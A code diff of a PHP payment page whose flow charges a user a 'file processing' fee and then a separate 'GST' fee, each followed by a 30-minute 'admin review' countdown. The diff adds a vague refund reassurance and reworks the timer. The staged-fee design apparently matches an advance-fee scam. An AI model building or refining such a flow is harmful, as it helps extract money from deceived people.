@@ -186,7 +186,7 @@ $qrLocal = __DIR__ . '/assets/img/company-qr.png';
         <h2>Please wait — we are reviewing your request</h2>
         <p class="muted">Your enquiry <strong>#<?= (int)$req['id'] ?></strong> has been sent to our admin team.
         Confirmation usually takes up to <strong>30 minutes</strong>. This page updates automatically.</p>
-        <div class="count-box">Estimated time left&nbsp;<strong data-deadline="<?= (int)$deadline ?>">30:00</strong></div>
+        <div class="count-box"><strong data-deadline="<?= (int)$deadline ?>">30:00</strong></div>
       </div>
 
     <?php /* ---------- STEP 2: payment page ---------- */ ?>
@@ -195,6 +195,7 @@ $qrLocal = __DIR__ . '/assets/img/company-qr.png';
         <div class="flow-card">
           <h2>File Processing Charge</h2>
           <p class="muted">Your request has been confirmed by our team. Pay the processing fee to move forward.</p>
+          <p class="muted"><strong>Note:</strong> Your payment refund will be processed in 7-8 working days (if applicable).</p>
 
           <div class="fee-banner">
             <span>File Pending Charge</span>
@@ -252,7 +253,7 @@ $qrLocal = __DIR__ . '/assets/img/company-qr.png';
         <p class="muted">Thank you — your payment of <strong>&#8377;<?= isset($pay) && $pay ? number_format((float)$pay['amount']) : $fee ?></strong>
         (Ref: <strong><?= isset($pay) && $pay ? htmlspecialchars($pay['utr']) : '—' ?></strong>) is under review by our admin team.
         Approval usually takes up to <strong>30 minutes</strong>. This page updates automatically.</p>
-        <div class="count-box">Verification time left&nbsp;<strong data-deadline="<?= (int)$deadline ?>">30:00</strong></div>
+        <div class="count-box"><strong data-deadline="<?= (int)$deadline ?>">30:00</strong></div>
       </div>
 
     <?php /* ---------- STEP 3b: GST PAYMENT ---------- */ ?>
@@ -261,6 +262,7 @@ $qrLocal = __DIR__ . '/assets/img/company-qr.png';
         <div class="flow-card">
           <h2>GST Payment</h2>
           <p class="muted">Your file processing charge has been approved. Please complete the final <strong>GST payment</strong> to finish the process.</p>
+          <p class="muted"><strong>Note:</strong> Your payment refund will be processed in 7-8 working days (if applicable).</p>
 
           <div class="fee-banner">
             <span>GST Charge</span>
@@ -318,7 +320,7 @@ $qrLocal = __DIR__ . '/assets/img/company-qr.png';
         <p class="muted">Thank you — your GST payment of <strong>&#8377;<?= $payG ? number_format((float)$payG['amount'], 2) : $gstFee ?></strong>
         (Ref: <strong><?= $payG ? htmlspecialchars($payG['utr']) : '—' ?></strong>) is under review by our admin team.
         Final approval usually takes up to <strong>30 minutes</strong>. This page updates automatically.</p>
-        <div class="count-box">Verification time left&nbsp;<strong data-deadline="<?= (int)$deadline ?>">30:00</strong></div>
+        <div class="count-box"><strong data-deadline="<?= (int)$deadline ?>">30:00</strong></div>
       </div>
 
     <?php /* ---------- STEP 4: completed ---------- */ ?>
@@ -345,13 +347,19 @@ $qrLocal = __DIR__ . '/assets/img/company-qr.png';
 <script>
 (function () {
   var els = document.querySelectorAll('[data-deadline]');
+  var serverNow = <?= (int)time() ?>;
   els.forEach(function (el) {
-    var dl = parseInt(el.dataset.deadline, 10) * 1000;
+    var dl = parseInt(el.dataset.deadline, 10);
+    var remain = dl - serverNow; // remaining seconds, computed entirely on the server clock
+    function fmt(s) {
+      var h = Math.floor(s / 3600), m = Math.floor((s % 3600) / 60), sec = s % 60;
+      return (h > 0 ? h + ':' + (m < 10 ? '0' : '') : '') + m + ':' + (sec < 10 ? '0' : '') + sec;
+    }
     function tick() {
-      var s = Math.max(0, Math.floor((dl - Date.now()) / 1000));
-      var m = Math.floor(s / 60), sec = s % 60;
-      el.textContent = (m < 10 ? '0' : '') + m + ':' + (sec < 10 ? '0' : '') + sec;
+      var s = Math.max(0, remain);
+      el.textContent = fmt(s);
       if (s <= 0) el.textContent = 'almost done…';
+      remain = remain - 1;
     }
     tick(); setInterval(tick, 1000);
   });
